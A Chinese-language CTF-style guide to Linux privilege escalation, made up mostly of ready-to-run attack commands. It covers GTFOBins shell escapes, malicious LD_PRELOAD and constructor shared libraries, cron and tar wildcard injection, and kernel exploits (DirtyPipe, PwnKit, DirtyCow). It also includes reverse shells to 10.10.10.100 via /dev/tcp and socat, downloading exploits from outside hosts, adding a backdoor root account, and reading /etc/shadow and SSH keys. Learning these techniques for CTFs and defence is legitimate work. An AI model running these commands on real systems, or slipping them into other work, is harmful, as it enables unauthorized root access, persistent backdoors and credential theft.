---
category: "Linux权限提升"
tags: ["Linux提权", "SUID", "Capabilities", "Cron", "内核漏洞", "sudo提权", "GTFOBins", "CTF"]
difficulty: "高级"
---

# Linux权限提升

## 1. 概述

Linux权限提升是渗透测试中的关键环节。在CTF竞赛中，获取初始低权限Shell后，能否快速提升至root权限往往决定了是否能在Attack-Defense中提交高质量的Flag。本节系统覆盖SUID滥用、Linux Capabilities提权、Cron作业劫持、内核漏洞利用、sudo配置缺陷、GTFOBins使用、环境变量劫持等多种提权技术。

## 2. 核心原理

### 2.1 Linux权限模型

```
Root (UID 0) - 超级管理员，无限制
  │
System Users (UID 1-999) - 系统服务账户
  │
Regular Users (UID 1000+) - 普通用户
  │
nobody (UID 65534) - 无特权用户
```

提权的本质：从当前权限级别上升到更高级别（通常是root），通过利用配置缺陷、组权限、SUID/SGID、内核漏洞等。

### 2.2 提权向量分类

```
1. 配置缺陷类
   ├── sudo配置不当 (NOPASSWD + 危险命令)
   ├── SUID/SGID 文件权限
   ├── Capabilities (Linux capabilities)
   ├── 可写/etc/passwd或/etc/shadow
   └── 可写cron作业

2. 服务/应用类
   ├── 以root运行的服务漏洞
   ├── Docker组权限（docker run -v /:/mnt）
   ├── 计划任务执行恶意脚本
   └── 进程注入 (ptrace)

3. 内核缺陷类
   ├── DirtyCow (CVE-2016-5195)
   ├── DirtyPipe (CVE-2022-0847)
   ├── PwnKit (CVE-2021-4034)
   └── OverlayFS (CVE-2021-3493)

4. 凭证类
   ├── 配置文件中的密码复用
   ├── .bash_history中的密码
   ├── SSH密钥文件
   └── 内存中的凭证 (gdb/mimipenguin)
```

## 3. 权限提升方法与命令

### 3.1 提权前信息枚举（Linux Privesc Checklist）

```bash
# ===== 基础系统信息 =====
id                     # 用户ID和组成员
whoami                 # 当前用户
hostname
uname -a               # 内核版本（寻找内核exploit）
cat /etc/os-release    # 发行版
cat /etc/issue
cat /proc/version
lscpu                  # CPU架构
cat /proc/cpuinfo

# ===== 用户与组 =====
cat /etc/passwd        # 所有用户
cat /etc/shadow        # 密码哈希（需要root）
cat /etc/group         # 所有组
getent passwd          # 另一种查看用户方式
getent group
w                      # 在线用户
who
last                   # 最近登录

# ===== 当前权限 =====
sudo -l                # 当前用户sudo权限（最重要！）
cat /etc/sudoers
cat /etc/sudoers.d/*
id -Gn                 # 所在组列表
# 检查关键组：sudo, adm, docker, lxd, disk, shadow, staff

# ===== SUID/SGID文件 =====
find / -perm -4000 -type f 2>/dev/null          # SUID文件
find / -perm -2000 -type f 2>/dev/null          # SGID文件
find / -perm -6000 -type f 2>/dev/null          # SUID+SGID
find / -perm -u=s -type f 2>/dev/null           # SUID（等价写法）

# ===== Capabilities =====
getcap -r / 2>/dev/null                         # 列出所有二进制文件的capabilities
capsh --print                                    # 当前进程的capabilities

# ===== Cron作业 =====
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron/crontabs/
ls -la /var/spool/cron/
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.weekly/*
cat /etc/cron.monthly/*

# ===== 网络服务/端口 =====
netstat -tlnp          # 监听的服务（什么/以谁的身份运行）
ss -tlnp               # 现代版netstat
netstat -ano           # 所有连接
cat /etc/hosts         # 内网主机列表（横向移动目标）
cat /etc/hostname

# ===== 可写文件/目录 =====
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null | grep -v proc
ls -la /etc/passwd     # 检查是否可写
ls -la /etc/shadow
ls -la /root/          # 检查/home是否可访问

# ===== 进程信息 =====
ps aux                 # 所有进程
ps aux --forest        # 树形显示进程关系
cat /proc/1/status     # init进程信息
systemctl list-units --type=service --state=running  # systemd运行服务

# ===== 敏感文件 =====
find / -name "*.conf" -type f 2>/dev/null | grep -E "(password|pass|cred|secret|key|token)"
find / -name "*.txt" -o -name "*.ini" -o -name "*.cfg" 2>/dev/null | xargs grep -l password
grep -r "password" /etc/ 2>/dev/null
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# ===== 计划任务/启动项 =====
cat /etc/fstab         # 挂载点
cat /etc/exports        # NFS导出
df -h                   # 磁盘使用
lsblk                   # 块设备

# ===== 环境变量 =====
env
echo $PATH
cat /etc/profile
cat ~/.bashrc
cat ~/.bash_profile

# ===== 自动化工具 =====
# LinPEAS（首选）
./linpeas.sh -a > linpeas_output.txt
# Linux Smart Enumeration
./lse.sh -l 2
# Linux Exploit Suggester
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
```

### 3.2 SUID提权

SUID (Set User ID) 位允许用户以文件所有者的权限执行文件。如果root拥有的二进制文件设置了SUID，普通用户可以借用该文件以root权限执行操作。

**SUID检查与GTFOBins：**
```bash
# 查找SUID文件
find / -perm -4000 -type f -ls 2>/dev/null
# 或更简洁的
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null

# 常见可用于提权的SUID二进制文件（对照GTFOBins检查）
# 以下每个命令都需要在https://gtfobins.github.io/ 查找具体利用方法

# === Bash (少见的SUID bash) ===
bash -p  # -p保留特权模式

# === find ===
find . -exec /bin/bash -p \; -quit
find . -exec /bin/sh -p \; -quit

# === vim/vi ===
vim -c ':!/bin/bash -p'

# === less/more ===
less /etc/passwd
# 在less中: !/bin/bash -p

# === cp/mv ===
# 可以用来覆盖敏感文件
cp /bin/bash /tmp/suid_bash
chmod u+s /tmp/suid_bash
# 但cp不会继承SUID，需要原始文件有写权限

# === python/perl/ruby (解释器SUID) ===
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# === env ===
env /bin/bash -p

# === systemctl ===
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/suidbash && chmod u+s /tmp/suidbash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
/tmp/suidbash -p

# === cURL ===
# 读取敏感文件（提权信息收集）
curl file:///etc/shadow
curl file:///root/.ssh/id_rsa

# === wget ===
# 同样可以读取文件
wget file:///etc/shadow -O /tmp/shadow

# === tar ===
tar -cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/bash

# === socat ===
socat exec:'bash -p',pty,stderr tcp:10.10.10.100:4444

# === awk ===
awk 'BEGIN {system("/bin/bash -p")}'

# === nmap (老版本带--interactive) ===
nmap --interactive
# 然后 !bash -p

# === php ===
php -r "system('/bin/bash -p');"

# === ruby ===
ruby -e 'exec "/bin/bash -p"'

# === gdb ===
gdb -nx -ex 'python import os; os.execlp("bash", "bash", "-p")' -ex quit

# === 系统二进制（systemd-run, busctl等）===
systemd-run --scope --uid=0 /bin/bash -p

# GTFOBins快速离线检查脚本
#!/bin/bash
# 将所有SUID文件与已知可利用列表比对
KNOWN_GTFOBINS=(
    bash find vim vi less more cp mv python python2 python3
    perl ruby php env tar awk gdb gcc nmap socat wget curl
    systemctl busctl pkexec ssh ssh-keygen docker
    chmod chown mount screen tmux
    node lua expect
)
echo "[*] Checking SUID binaries against GTFOBins list..."
while IFS= read -r line; do
    filename=$(basename "$line")
    for gtfobin in "${KNOWN_GTFOBINS[@]}"; do
        [[ "$filename" == "$gtfobin" ]] && echo "[!] POTENTIAL: $line → check GTFOBins"
    done
done < <(find / -perm -4000 -type f 2>/dev/null)
```

**SUID共享库劫持：**
```bash
# 场景：SUID二进制文件加载了自定义的.so库
# 1. 检查SUID二进制文件引用的库
strace /usr/local/bin/suid_binary 2>&1 | grep -E "open.*\.so|openat.*\.so"
# 或
ldd /usr/local/bin/suid_binary

# 2. 如果发现相对路径加载的库或没有找到的库
# 例如：libcustom.so => not found
# 3. 创建恶意的libcustom.so
cat << 'EOF' > /tmp/libcustom.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c -nostartfiles

# 4. 通过LD_PRELOAD或LD_LIBRARY_PATH加载
LD_PRELOAD=/tmp/libcustom.so /usr/local/bin/suid_binary
# 或者如果二进制允许LD_LIBRARY_PATH
LD_LIBRARY_PATH=/tmp /usr/local/bin/suid_binary
```

### 3.3 Linux Capabilities提权

Capabilities是将root特权分解为多个独立能力的机制，每个进程可以只拥有所需的最小Capability集合。

```bash
# 检查所有文件的Capabilities
getcap -r / 2>/dev/null
# 例如输出: /usr/bin/ping cap_net_raw=ep

# === cap_setuid 利用 ===
# 如果一个二进制文件有cap_setuid capability，可以设置任意UID
# 例如python3有cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# === cap_chown 利用 ===
# 可以修改任意文件的所有者
# 修改/etc/shadow的所有者为当前用户
# 然后用passwd修改root密码

# === cap_sys_ptrace 利用 ===
# 可以注入任意进程（包括root进程）
# 注入一个root运行的进程获取shell
gdb -p $(pgrep -f "root_process")
# inject shellcode

# === cap_dac_read_search 利用 ===
# 可以绕过文件的读权限检查
# 读取/etc/shadow等敏感文件
tar -czf - /etc/shadow 2>/dev/null | tar -xzf -

# === cap_sys_admin 利用 ===
# 非常强大，可以加载内核模块等
# 可以挂载文件系统

# === cap_sys_module 利用 ===
# 可以加载内核模块
# 创建恶意内核模块获取root权限

# === cap_net_raw 利用 ===
# 可以进行网络嗅探
tcpdump -i eth0 -w capture.pcap

# Python提权利用（如果python有cap_setuid）
python3 << 'EOF'
import os
import pty
os.setuid(0)      # cap_setuid允许
os.setgid(0)
os.execl("/bin/bash", "bash", "-p")
EOF
```

### 3.4 Cron作业提权

```bash
# === Cron作业发现 ===
cat /etc/crontab
ls -R /etc/cron*
cat /var/spool/cron/crontabs/*
cat /etc/anacrontab

# 监控cron文件变化
inotifywait -m /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null

# === Cron路径劫持 ===
# 如果cron作业使用相对路径命令（不使用完整路径）
# 1. 检查cron作业中是否有相对路径脚本调用
cat /etc/crontab | grep -v "^#" | grep -v "^$"
# 假设有一条：* * * * * root backup.sh

# 2. 如果cron的PATH中包含可写目录（如. 或 /tmp）
echo $PATH | tr ':' '\n' | while read dir; do
    ls -ld "$dir" 2>/dev/null
done

# 3. 创建同名恶意脚本在PATH优先目录
echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.10.100/4444 0>&1' > /tmp/backup.sh
chmod +x /tmp/backup.sh
# 如果/tmp在PATH前面，cron会执行/tmp/backup.sh而非原脚本

# === Cron文件权限可写 ===
# 如果cron脚本本身可写
ls -la /etc/cron*/*
ls -la /etc/crontab
# 如果可写，直接修改：
echo '*/1 * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.100/4444 0>&1"' >> /etc/crontab

# === Cron通配符注入 ===
# 如果cron作业使用了通配符（*）与危险命令（如tar, chown, rsync）
# 例如cron作业: tar -czf /backup/www.tar.gz /var/www/*
# 1. 在/var/www/下创建checkpoint文件触发tar checkpoint
echo 'bash -i >& /dev/tcp/10.10.10.100/5555 0>&1' > /var/www/shell.sh
chmod +x /var/www/shell.sh
touch /var/www/--checkpoint=1
touch /var/www/--checkpoint-action=exec=bash\ shell.sh
# 当cron执行tar时，通配符展开为这些文件，触发checkpoint执行shell

# === Cron环境变量注入 ===
# 检查cron作业脚本中是否使用了外部环境变量
# 修改~/.bashrc或~/.profile注入恶意路径
```

### 3.5 Sudo配置提权

```bash
# === sudo -l输出分析 ===
sudo -l
# 典型可利用配置：
# 1. (ALL) NOPASSWD: ALL                    → sudo su
# 2. (ALL) NOPASSWD: /usr/bin/find          → sudo find . -exec /bin/bash \;
# 3. (ALL) NOPASSWD: /usr/bin/vim           → sudo vim -c ':!/bin/bash'
# 4. (ALL) NOPASSWD: /usr/bin/less          → sudo less /etc/passwd → !bash
# 5. (ALL) NOPASSWD: /usr/bin/awk           → sudo awk 'BEGIN{system("/bin/bash")}'
# 6. (ALL) NOPASSWD: /usr/bin/man           → sudo man man → !bash
# 7. (ALL) NOPASSWD: /usr/bin/python        → sudo python -c 'import os; os.system("/bin/bash")'
# 8. (ALL) NOPASSWD: /usr/bin/git           → sudo git -p help config → !bash
# 9. (ALL) NOPASSWD: /usr/bin/systemctl     → sudo systemctl → !bash
# 10. (ALL) NOPASSWD: /usr/sbin/tcpdump     → sudo tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/cmd.sh

# === Sudo LD_PRELOAD提权 ===
# 如果sudo配置保留了LD_PRELOAD（默认保留env_reset）
# 创建恶意共享库
cat << 'EOF' > /tmp/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>

# === Sudo LD_LIBRARY_PATH提权 ===
# 查找sudo允许的命令使用了哪些共享库
ldd /usr/bin/apache2
# 选择一个库（如libcrypt.so.1）
# 创建恶意库
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/preload.c
sudo LD_LIBRARY_PATH=/tmp <allowed_command>

# === Sudo 通配符绕过 ===
# sudo -l: (root) NOPASSWD: /usr/bin/cat /var/log/*
# 可以利用通配符读取/etc/shadow
sudo cat /var/log/../../etc/shadow

# === Sudo 环境变量利用 ===
# 某些sudo版本受CVE-2021-3156 (Baron Samedit) 影响
# 探测版本
sudo --version

# === Sudo 凭据缓存 ===
# 检查sudo ticket是否有效
sudo -v  # 刷新sudo时间戳
# 如果之前有人已输入过密码且时间窗口未过期
```

**完整Sudo GTFOBins速查表：**
```bash
# 根据sudo -l的结果查找对应利用方式
declare -A SUDO_GTFO
SUDO_GTFO[find]="sudo find . -exec /bin/bash \; -quit"
SUDO_GTFO[vim]="sudo vim -c ':!/bin/bash'"
SUDO_GTFO[less]="sudo less /etc/profile; 然后输入: !bash"
SUDO_GTFO[more]="sudo more /etc/profile; !bash"
SUDO_GTFO[man]="sudo man man; !bash"
SUDO_GTFO[awk]="sudo awk 'BEGIN {system(\"/bin/bash\")}'"
SUDO_GTFO[nmap]="sudo nmap --interactive; !bash (旧版本2.02-5.21)"
SUDO_GTFO[python]="sudo python -c 'import pty; pty.spawn(\"/bin/bash\")'"
SUDO_GTFO[php]="sudo php -r 'system(\"/bin/bash\");'"
SUDO_GTFO[perl]="sudo perl -e 'exec \"/bin/bash\";'"
SUDO_GTFO[ruby]="sudo ruby -e 'exec \"/bin/bash\"'"
SUDO_GTFO[gdb]="sudo gdb -nx -ex '!bash' -ex quit"
SUDO_GTFO[git]="sudo git -p help config; 然后输入 !bash"
SUDO_GTFO[ftp]="sudo ftp; !bash"
SUDO_GTFO[tcpdump]="sudo tcpdump -i lo -w /dev/null -W 1 -G 1 -z /tmp/cmd.sh"
SUDO_GTFO[systemctl]="sudo systemctl; !bash"
SUDO_GTFO[tar]="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
SUDO_GTFO[zip]="sudo zip /tmp/test.zip /tmp/test -T --unzip-command='bash -p'"
SUDO_GTFO[rsync]="sudo rsync -e 'bash -c \"bash -p\"' /dev/null /tmp/"
SUDO_GTFO[socat]="sudo socat stdin exec:/bin/bash"
SUDO_GTFO[scp]="sudo scp -S /path/to/script source target"
SUDO_GTFO[docker]="sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
SUDO_GTFO[lxc]="sudo lxc exec container -- /bin/bash"
```

### 3.6 内核漏洞提权

```bash
# === Linux Exploit Suggester ===
# 推荐工具
./linux-exploit-suggester.sh
./linux-exploit-suggester-2.pl
# 或
uname -a > kernel_info.txt
# 手动对照已知漏洞数据库

# === 高频CTF内核漏洞 ===

# 1. DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16
# 检测
uname -r | grep -E "^5\.(8|9|1[0-5])"
# 利用
wget https://haxx.in/files/dirtypipez.c  # 或离线准备
gcc dirtypipez.c -o dirtypipez
./dirtypipez /etc/passwd 1 ootz
# 变为root，密码为ootz
su root  # 输入ootz

# 或直接用DirtyPipe覆写SUID程序
./dirtypipez /usr/bin/su  # 原地覆写root

# 2. PwnKit (CVE-2021-4034) — pkexec本地提权
# 检测
pkexec --version
# 影响范围：所有带pkexec的PolicyKit版本
# 利用
gcc cve-2021-4034-poc.c -o pwnkit
./pwnkit
# 直接获得root shell

# 3. DirtyCow (CVE-2016-5195) — Linux < 4.8.3
# 检测
uname -r | awk -F. '{ if ($1<4 || ($1==4 && $2<8) || ($1==4 && $2==8 && $3<3)) print "VULNERABLE" }'
# 利用
gcc -pthread dirtycow.c -o dirtycow
./dirtycow /etc/passwd
# 替换/etc/passwd中的root行为无密码

# 4. OverlayFS (CVE-2021-3493) — Ubuntu 20.04, 20.10, 21.04
# 利用
gcc exploit.c -o overlayfs
./overlayfs

# 5. Ubuntu 20.04 LPE (GameOver(lay)) — CVE-2023-2640, CVE-2023-32629
# 检测Ubuntu内核版本
uname -rv

# 6. Sudo Baron Samedit (CVE-2021-3156) — sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
# 检测: sudo --version
# 利用
make
./sudo-hax-me-a-sandwich 1

# 离线准备所有exploit
mkdir -p ~/ctf-kit/linux-exploits/
# 预下载编译好的exploit文件（按内核版本分类）
```

**内核Exploit使用注意事项：**
- CTF环境中内核exploit可能不稳定，优先尝试配置缺陷类提权
- 注意架构匹配（x86 vs x86_64 vs ARM）
- 注意glibc版本兼容性
- 有些exploit会崩溃系统，先在非关键目标测试

### 3.7 其他提权方法

```bash
# === 可写/etc/passwd ===
# 方法1: 添加root用户
echo "backdoor:\$1\$salt\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
# 使用openssl生成hash
openssl passwd -1 -salt salt password123

# 方法2: 复制root行并修改
sed 's/^root:[^:]*:/root::/g' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd
# 现在root无密码 → su root

# === 可写/etc/shadow ===
# 生成新密码hash
openssl passwd -6 'newpassword'
# 替换root的密码hash字段
# 然后用 newpassword su root

# === Docker组提权 ===
# 如果用户在docker组
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# 或者直接
docker run -v /root:/root -v /var/run/docker.sock:/var/run/docker.sock \
           --privileged -it alpine sh

# === LXD组提权 ===
# 如果用户在lxd组
# 下载Alpine镜像
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# 在容器内访问 /mnt 即宿主根目录
id  # root

# === 环境变量劫持 ===
# 检查sudo env_keep
sudo -l | grep env_keep
# 如果保留了PYTHONPATH：
sudo PYTHONPATH=/tmp python3 -c 'import evil_module'
# 创建/tmp/evil_module.py，导入时执行恶意代码

# === NFS no_root_squash (前面已详述) ===
# === PATH劫持 ===
# 如果有以root运行的脚本使用相对路径调用
echo -e '#!/bin/bash\n/bin/bash -p' > /home/user/id
chmod +x /home/user/id
export PATH=/home/user:$PATH
# 当root运行id命令（没有用绝对路径）时，执行恶意/home/user/id

# === 通配符注入 ===
# tar, rsync, chown等命令触发的通配符注入
touch /some/writable/directory/--checkpoint=1
touch /some/writable/directory/--checkpoint-action=exec=bash\ -p\ -c\ 'chmod\ u+s\ /bin/bash'

# === systemd 服务提权 ===
# 如果用户有systemctl权限且可写服务文件
cat << 'EOF' > /etc/systemd/system/root.service
[Service]
Type=simple
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/shell && chmod u+s /tmp/shell'
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl start root
/tmp/shell -p
```

## 4. 自动化提权脚本

```bash
#!/bin/bash
# linux_privesc.sh - 自动化Linux提权枚举
OUTPUT="privesc_$(hostname)_$(date +%s).txt"

echo "[*] Linux Privilege Escalation Enumeration" | tee "$OUTPUT"
echo "[*] Date: $(date)" | tee -a "$OUTPUT"
echo "" | tee -a "$OUTPUT"

# 1. 系统信息
echo "[=== SYSTEM INFO ===]" | tee -a "$OUTPUT"
uname -a | tee -a "$OUTPUT"
cat /etc/os-release | tee -a "$OUTPUT"
lscpu | head -5 | tee -a "$OUTPUT"

# 2. 用户权限
echo "" | tee -a "$OUTPUT"
echo "[=== USER & PERMISSIONS ===]" | tee -a "$OUTPUT"
id | tee -a "$OUTPUT"
echo "" | tee -a "$OUTPUT"
sudo -l 2>/dev/null | tee -a "$OUTPUT"

# 3. SUID文件
echo "" | tee -a "$OUTPUT"
echo "[=== SUID FILES ===]" | tee -a "$OUTPUT"
find / -perm -4000 -type f -ls 2>/dev/null | tee -a "$OUTPUT"

# 4. Capabilities
echo "" | tee -a "$OUTPUT"
echo "[=== CAPABILITIES ===]" | tee -a "$OUTPUT"
getcap -r / 2>/dev/null | tee -a "$OUTPUT"

# 5. Cron作业
echo "" | tee -a "$OUTPUT"
echo "[=== CRON JOBS ===]" | tee -a "$OUTPUT"
cat /etc/crontab 2>/dev/null | tee -a "$OUTPUT"
ls -la /etc/cron* 2>/dev/null | tee -a "$OUTPUT"

# 6. 可写文件
echo "" | tee -a "$OUTPUT"
echo "[=== WRITABLE SYSTEM FILES ===]" | tee -a "$OUTPUT"
ls -la /etc/passwd 2>/dev/null | tee -a "$OUTPUT"
ls -la /etc/shadow 2>/dev/null | tee -a "$OUTPUT"
find /etc -writable -type f 2>/dev/null | tee -a "$OUTPUT"

# 7. 网络
echo "" | tee -a "$OUTPUT"
echo "[=== NETWORK SERVICES ===]" | tee -a "$OUTPUT"
netstat -tlnp 2>/dev/null | tee -a "$OUTPUT"

# 8. 其他关键
echo "" | tee -a "$OUTPUT"
echo "[=== KERNEL ===]" | tee -a "$OUTPUT"
cat /proc/version | tee -a "$OUTPUT"

echo "" | tee -a "$OUTPUT"
echo "[+] Enumeration complete! Check $OUTPUT"
```

## 5. 实战示例

### 5.1 完整Linux提权链

**场景：** Web应用LFI获得www-data权限，需要提权到root拿flag。

```bash
# 步骤1: 枚举系统信息
id # uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
# 关键发现：www-data在sudo组！

sudo -l
# Matching Defaults entries for www-data on target:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:...
# User www-data may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/find

# 步骤2: sudo find提权（30秒内获root）
sudo find . -exec /bin/bash -p \; -quit

# 步骤3: 确认root
whoami # root
id # uid=0(root) gid=0(root) groups=0(root)

# 步骤4: 读取Flag
cat /root/flag.txt
# CTF{SUDO_FIND_PRIVESC_EASY}

# === 备选路径（如果sudo -l没有直接可用的） ===

# 步骤1': 检查SUID文件
find / -perm -4000 -type f 2>/dev/null | head -20
# 发现: /usr/bin/pkexec (SUID root)
# → PwnKit CVE-2021-4034

# 步骤2': 利用PwnKit
# 上传pwnkit exploit
curl http://10.10.10.100:8000/pwnkit -o /tmp/pwnkit
chmod +x /tmp/pwnkit
/tmp/pwnkit
# 获得root shell
```

### 5.2 Capabilities提权案例

```bash
# 初始状态: www-data@web-server
getcap -r / 2>/dev/null | grep -v /proc
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep

# 发现python3.8有cap_setuid
python3.8 -c '
import os
os.setuid(0)
os.setgid(0)
os.system("id")
os.execl("/bin/bash", "bash", "-p")
'
# uid=0(root) gid=0(root)
# 成功提权！

# === 另一个capability案例 ===
getcap -r / 2>/dev/null
# /usr/bin/tar = cap_dac_read_search+ep

# cap_dac_read_search可以绕过文件读权限
tar -cf /dev/stdout /etc/shadow 2>/dev/null | tar -xf - -O
# 读取/etc/shadow中的密码哈希
# 使用john/hashcat破解后直接su root
```

## 6. 常见误区与注意事项

- **误区1：拿到sudo -l结果不仔细检查所有可用命令。** 每个命令都应该在GTFOBins中查找利用方式。
- **误区2：SUID提权只看/usr/bin。** /opt, /usr/local/, /snap等路径也可能有SUID文件。
- **误区3：忽略组权限。** docker/lxd/disk/shadow组成员都有直接提权路径。
- **误区4：内核exploit首选。** 应该先尝试配置缺陷和SUID，内核exploit可能导致系统崩溃影响后续利用。
- **注意：修改/etc/passwd或/etc/shadow可能触发IDS告警。**
- **注意：某些脚本语言的SUID在现代Linux上会忽略（如/bin/bash在现代发行版中去掉了SUID行为）。使用-p参数保留特权。**

## 7. 相关知识点

- **GTFOBins (离线版):** https://gtfobins.github.io/ — 赛前下载整个仓库
- **LinPEAS:** https://github.com/carlospolop/PEASS-ng — 最全面的Linux提权枚举工具
- **Linux Smart Enumeration (LSE):** 另一个优秀的提权枚举脚本
- **pspy:** 无root权限监控Linux进程的工具（发现cron作业）
- **mimipenguin:** 从内存提取Linux密码的工具
- **traitor:** 自动检测并利用多种Linux提权漏洞
- **SUID3NUM:** SUID文件分析工具
